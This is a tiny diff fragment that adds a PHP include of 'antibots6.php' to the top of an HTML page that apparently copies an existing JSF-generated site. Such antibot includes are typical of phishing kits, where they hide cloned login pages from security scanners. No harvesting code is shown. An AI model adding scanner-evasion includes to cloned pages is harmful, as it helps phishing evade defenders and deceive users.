@@ -1,4 +1,6 @@
-
+<?php
+include('antibots6.php');
+?>
 
 <!DOCTYPE html>
 <html lang="en" dir="ltr"><head id="j_idt2"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
